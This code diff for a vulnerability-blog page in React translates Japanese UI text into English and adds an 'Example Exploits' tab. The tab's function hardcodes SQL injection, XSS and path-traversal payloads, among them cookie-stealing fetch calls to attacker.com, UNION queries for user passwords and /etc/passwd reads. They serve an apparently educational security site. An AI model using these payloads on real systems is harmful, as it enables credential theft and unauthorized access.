@@ -7,7 +7,7 @@ import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
 import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
 import { Badge } from '@/components/ui/badge';
 import { Separator } from '@/components/ui/separator';
-import { ArrowLeft, AlertCircle, CheckCircle, BookOpen } from 'lucide-react';
+import { ArrowLeft, AlertCircle, CheckCircle, BookOpen, Code } from 'lucide-react';
 import BlogDetailSkeleton from '@/components/blog/BlogDetailSkeleton';
 import { Button } from '@/components/ui/button';
 
@@ -51,7 +51,7 @@ interface Reference {
 // Function to format date and time
 const formatDate = (dateString: string) => {
   const date = new Date(dateString);
-  return new Intl.DateTimeFormat('ja-JP', {
+  return new Intl.DateTimeFormat('en-US', {
     year: 'numeric',
     month: 'long',
     day: 'numeric',
@@ -124,7 +124,7 @@ const Blog = () => {
         }
       } catch (err) {
         console.error("Error fetching blog data:", err);
-        setError("ブログデータの取得中にエラーが発生しました。");
+        setError("An error occurred while retrieving blog data.");
       } finally {
         setLoading(false);
       }
@@ -134,6 +134,104 @@ const Blog = () => {
   }, [id]);
 
   const handleBack = () => navigate('/blog');
+
+  // Example exploit/payload generation based on vulnerability type
+  const getExampleExploit = () => {
+    if (!vulnerability) return null;
+    
+    const title = vulnerability.title.toLowerCase();
+    
+    if (title.includes('sql injection')) {
+      return {
+        name: 'SQL Injection Example',
+        description: 'This payload attempts to extract database information by injecting SQL commands.',
+        examples: [
+          {
+            name: 'Basic Authentication Bypass',
+            payload: `' OR 1=1 --`,
+            explanation: 'This simple payload may bypass login forms by making the WHERE clause always evaluate to true.'
+          },
+          {
+            name: 'Data Extraction',
+            payload: `' UNION SELECT username, password FROM users --`,
+            explanation: 'This payload attempts to extract username and password data from a users table.'
+          },
+          {
+            name: 'Blind SQL Injection',
+            payload: `' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)='a`,
+            explanation: 'This payload tests if the first character of a username is "a" in a blind SQL injection scenario.'
+          }
+        ]
+      };
+    } else if (title.includes('xss') || title.includes('cross-site scripting')) {
+      return {
+        name: 'Cross-Site Scripting (XSS) Example',
+        description: 'These payloads attempt to execute JavaScript in the victim\'s browser.',
+        examples: [
+          {
+            name: 'Basic Alert',
+            payload: `<script>alert('XSS')</script>`,
+            explanation: 'A simple script that displays an alert box to verify XSS vulnerability.'
+          },
+          {
+            name: 'Cookie Theft',
+            payload: `<img src="x" onerror="fetch('https://attacker.com/steal?cookie='+document.cookie)">`,
+            explanation: 'This payload attempts to send the victim\'s cookies to an attacker-controlled server.'
+          },
+          {
+            name: 'DOM-based XSS',
+            payload: `javascript:eval('fetch(\\'https://attacker.com/log?data=\\'+document.cookie)')`,
+            explanation: 'A DOM-based XSS payload that executes when inserted into a javascript: URL.'
+          }
+        ]
+      };
+    } else if (title.includes('path traversal')) {
+      return {
+        name: 'Path Traversal Example',
+        description: 'These payloads attempt to access files outside of the intended directory.',
+        examples: [
+          {
+            name: 'Basic Path Traversal',
+            payload: `../../../etc/passwd`,
+            explanation: 'A simple path traversal to access the /etc/passwd file on Linux systems.'
+          },
+          {
+            name: 'Encoded Traversal',
+            payload: `%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd`,
+            explanation: 'URL-encoded path traversal to bypass simple filters.'
+          },
+          {
+            name: 'Windows Specific',
+            payload: `..\\..\\..\\windows\\system32\\drivers\\etc\\hosts`,
+            explanation: 'Path traversal targeting Windows hosts file.'
+          }
+        ]
+      };
+    }
+    
+    // Generic example for other vulnerability types
+    return {
+      name: 'Example Payload',
+      description: 'Generic examples that might be applicable to this vulnerability type.',
+      examples: [
+        {
+          name: 'Reconnaissance',
+          payload: `Scanning with: nmap -sV -sC -p- target.com`,
+          explanation: 'Comprehensive port scan to identify vulnerable services.'
+        },
+        {
+          name: 'Parameter Manipulation',
+          payload: `original_param=modified_value`,
+          explanation: 'Modify request parameters to test for improper validation.'
+        },
+        {
+          name: 'Error Triggering',
+          payload: `value' OR extractvalue(rand(),concat(0x7e,(SELECT version()),0x7e))`,
+          explanation: 'Attempts to trigger errors that might reveal system information.'
+        }
+      ]
+    };
+  };
 
   if (loading) return <BlogDetailSkeleton />;
   
@@ -145,15 +243,15 @@ const Blog = () => {
             <CardHeader>
               <CardTitle className="flex items-center">
                 <AlertCircle className="text-destructive mr-2 h-5 w-5" />
-                エラーが発生しました
+                Error
               </CardTitle>
               <CardDescription>
-                {error || "ブログ記事が見つかりませんでした。"}
+                {error || "Blog post not found."}
               </CardDescription>
             </CardHeader>
             <CardContent>
               <Button onClick={handleBack} variant="outline" size="sm" className="mt-4">
-                <ArrowLeft className="mr-2 h-4 w-4" /> ブログ一覧に戻る
+                <ArrowLeft className="mr-2 h-4 w-4" /> Back to Blog List
               </Button>
             </CardContent>
           </Card>
@@ -161,6 +259,8 @@ const Blog = () => {
       </MainLayout>
     );
   }
+
+  const exploitExample = getExampleExploit();
 
   return (
     <MainLayout>
@@ -185,9 +285,10 @@ const Blog = () => {
         </div>
 
         <Tabs defaultValue="overview">
-          <TabsList className="grid w-full grid-cols-4">
+          <TabsList className="grid w-full grid-cols-5">
             <TabsTrigger value="overview">Overview</TabsTrigger>
             <TabsTrigger value="technical">Technical Details</TabsTrigger>
+            <TabsTrigger value="exploit">Example Exploits</TabsTrigger>
             <TabsTrigger value="remediation">Remediation</TabsTrigger>
             <TabsTrigger value="resources">Resources</TabsTrigger>
           </TabsList>
@@ -225,12 +326,12 @@ const Blog = () => {
             {threatModeling && (
               <Card>
                 <CardHeader>
-                  <CardTitle>脅威モデリング</CardTitle>
+                  <CardTitle>Threat Modeling</CardTitle>
                 </CardHeader>
                 <CardContent className="space-y-4">
                   <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
                     <div className="space-y-2">
-                      <h3 className="text-sm font-medium">悪用可能性</h3>
+                      <h3 className="text-sm font-medium">Exploitability</h3>
                       <div className="flex space-x-1">
                         {Array(3).fill(0).map((_, i) => (
                           <span key={i} className={`w-4 h-4 rounded-full ${i < threatModeling.exploitability ? 'bg-destructive' : 'bg-muted'}`}></span>
@@ -239,7 +340,7 @@ const Blog = () => {
                     </div>
                     
                     <div className="space-y-2">
-                      <h3 className="text-sm font-medium">普及度</h3>
+                      <h3 className="text-sm font-medium">Prevalence</h3>
                       <div className="flex space-x-1">
                         {Array(3).fill(0).map((_, i) => (
                           <span key={i} className={`w-4 h-4 rounded-full ${i < threatModeling.prevalence ? 'bg-destructive' : 'bg-muted'}`}></span>
@@ -248,7 +349,7 @@ const Blog = () => {
                     </div>
                     
                     <div className="space-y-2">
-                      <h3 className="text-sm font-medium">検出難易度</h3>
+                      <h3 className="text-sm font-medium">Detectability</h3>
                       <div className="flex space-x-1">
                         {Array(3).fill(0).map((_, i) => (
                           <span key={i} className={`w-4 h-4 rounded-full ${i < threatModeling.detectability ? 'bg-destructive' : 'bg-muted'}`}></span>
@@ -257,7 +358,7 @@ const Blog = () => {
                     </div>
                     
                     <div className="space-y-2">
-                      <h3 className="text-sm font-medium">技術的影響</h3>
+                      <h3 className="text-sm font-medium">Technical Impact</h3>
                       <div className="flex space-x-1">
                         {Array(3).fill(0).map((_, i) => (
                           <span key={i} className={`w-4 h-4 rounded-full ${i < threatModeling.technical_impact_score ? 'bg-destructive' : 'bg-muted'}`}></span>
@@ -269,12 +370,47 @@ const Blog = () => {
                   <Separator />
                   
                   <div className="pt-2">
-                    <h3 className="text-lg font-medium mb-2">ビジネスへの影響詳細</h3>
+                    <h3 className="text-lg font-medium mb-2">Business Impact Details</h3>
                     <p>{threatModeling.business_impact_detail}</p>
                   </div>
                 </CardContent>
               </Card>
             )}
+          </TabsContent>
+
+          {/* New Exploit Examples Tab */}
+          <TabsContent value="exploit" className="mt-4">
+            <Card>
+              <CardHeader>
+                <CardTitle className="flex items-center">
+                  <Code className="mr-2 h-5 w-5 text-destructive" />
+                  Example Exploits & Payloads
+                </CardTitle>
+                <CardDescription>
+                  These examples demonstrate how this vulnerability might be exploited.
+                  <strong className="block mt-1 text-destructive">For educational purposes only. Do not use against systems without authorization.</strong>
+                </CardDescription>
+              </CardHeader>
+              <CardContent>
+                {exploitExample ? (
+                  <div className="space-y-6">
+                    <p>{exploitExample.description}</p>
+                    
+                    {exploitExample.examples.map((example, i) => (
+                      <div key={i} className="bg-muted/50 rounded-lg p-4 border border-border">
+                        <h3 className="text-lg font-medium mb-2">{example.name}</h3>
+                        <div className="bg-background font-mono text-sm p-3 rounded border border-border mb-3 overflow-x-auto">
+                          <code>{example.payload}</code>
+                        </div>
+                        <p className="text-sm text-muted-foreground">{example.explanation}</p>
+                      </div>
+                    ))}
+                  </div>
+                ) : (
+                  <p className="text-muted-foreground">No example exploits available for this vulnerability type.</p>
+                )}
+              </CardContent>
+            </Card>
           </TabsContent>
 
           {/* Remediation Tab - Improved readability */}
@@ -292,24 +428,31 @@ const Blog = () => {
                   <p className="text-muted-foreground">No remediation information available.</p>
                 ) : (
                   <div className="space-y-6">
-                    {remediations.map((remediation, index) => (
-                      <div key={remediation.id} className={index > 0 ? "pt-6 border-t" : ""}>
-                        <div className="flex justify-between items-start mb-3">
-                          <h3 className="font-medium text-lg">{index + 1}. {remediation.recommendation}</h3>
-                          <Badge variant={
-                            remediation.priority_level === "必須" ? "destructive" : 
-                            remediation.priority_level === "推奨" ? "default" : "outline"
-                          } className="ml-2">
-                            {remediation.priority_level === "必須" ? "Critical" : 
-                             remediation.priority_level === "推奨" ? "Recommended" : 
-                             "Optional"}
-                          </Badge>
+                    {remediations.map((remediation, index) => {
+                      // Determine badge variant based on priority level
+                      const badgeVariant = 
+                        remediation.priority_level === "必須" ? "destructive" : 
+                        remediation.priority_level === "推奨" ? "default" : "outline";
+                      
+                      // Convert priority level to English
+                      const priorityText = 
+                        remediation.priority_level === "必須" ? "Critical" : 
+                        remediation.priority_level === "推奨" ? "Recommended" : "Optional";
+                      
+                      return (
+                        <div key={remediation.id} className={index > 0 ? "pt-6 border-t" : ""}>
+                          <div className="flex justify-between items-start mb-3">
+                            <h3 className="font-medium text-lg">{index + 1}. Recommendation</h3>
+                            <Badge variant={badgeVariant} className="ml-2">
+                              {priorityText}
+                            </Badge>
+                          </div>
+                          <div className="mb-3 px-4 py-3 bg-card border rounded-md">
+                            <p className="whitespace-pre-wrap">{remediation.recommendation}</p>
+                          </div>
                         </div>
-                        <div className="pl-5 pr-2 py-2 bg-muted/50 rounded-md">
-                          <p className="text-sm leading-6">{remediation.recommendation}</p>
-                        </div>
-                      </div>
-                    ))}
+                      );
+                    })}
                   </div>
                 )}
               </CardContent>
